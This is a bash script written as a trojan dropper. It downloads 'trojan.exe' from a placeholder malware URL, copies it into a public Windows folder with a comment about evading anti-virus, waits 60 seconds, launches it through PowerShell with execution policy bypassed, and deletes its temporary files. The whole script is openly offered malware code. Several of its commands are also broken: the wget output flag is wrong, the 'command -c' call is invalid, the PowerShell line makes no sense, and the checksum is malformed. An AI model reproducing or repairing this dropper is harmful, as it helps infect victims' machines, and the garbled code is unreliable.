#!/bin/bash

# --- Constants ---
EMAIL="user@example.com" # Replace with target user's email
DOWNLOAD_URL="https://your-malware-url.com/trojan.exe" # Replace with actual download URL
TEMP_DIR="/tmp/dropper"
TARGET_FILE="trojan.exe"
TRIGGER_TIME=60 # Seconds before launch

# --- Functions ---
function create_tempdir {
  mkdir -p "$TEMP_DIR" || exit 1
}

function download_file {
  if [[ ! -f "$TEMP_DIR/$TARGET_FILE" ]]; then
    echo "Downloading Trojan..."
    wget -q "$DOWNLOAD_URL" -o "$TEMP_DIR/$TARGET_FILE" || \
    curl -s "$DOWNLOAD_URL" -o "$TEMP_DIR/$TARGET_FILE" || {
      echo "Download failed. Check URL."
      exit 1
    }
  fi
}

function verify_checksum {
  local sha256=$(sha256sum "$TEMP_DIR/$TARGET_FILE" | awk '{print $1}')
  local expected_sha256="a1b2c3d4e5f678901234567890abcdabcdef" # Replace with real SHA256 hash

  if [[ "$sha256" != "$expected_sha256" ]]; then
    echo "Checksum failed! Download may be corrupted."
    exit 1
  fi
}


function place_file {
  # Saves Trojan to C:\Users\Public, tricks anti-virus
  local TARGET_FILE="$TEMP_DIR/$TARGET_FILE.tmp"

  if ! cp "$TARGET_FILE" "/mnt/cfs/users/public/$TARGET_FILE"; then # Windows PATH
    cp "$TARGET_FILE" "/tmp/$TARGET_FILE.tmp" || exit 1
  fi

}


function trigger_launch {
  # Executes the Trojan as a new process and terminates the Dropper
  local TARGET_FILE="$TEMP_DIR/$TARGET_FILE.tmp"

  # Using PowerShell for best compatibility across OSs
  if command -c "echo $TARGET_FILE | powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\System32\Cmd.exe" > /dev/null; then
    echo "Launching Trojan..."
  else
    echo "Launch failed. Check PowerShell."
    exit 1
  fi

}

function cleanup {
  # Remove temporary files and directories
  if [[ -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi
}

# --- Main Execution ---
create_tempdir # Create temp directory if it doesn't exist

download_file # Download the Trojan to the temp directory

verify_checksum # Verify the download checksum for integrity.

place_file # Rename file and move to C:\Users\Public (or /tmp)

# Trigger the launch of the Trojan 60 seconds from now
echo "Waiting... in 60 seconds..."
sleep "$TRIGGER_TIME"

trigger_launch # Launches the Trojan as a new process.

cleanup # Remove temporary files and directories

echo "Dropper complete! The Trojan has been launched."
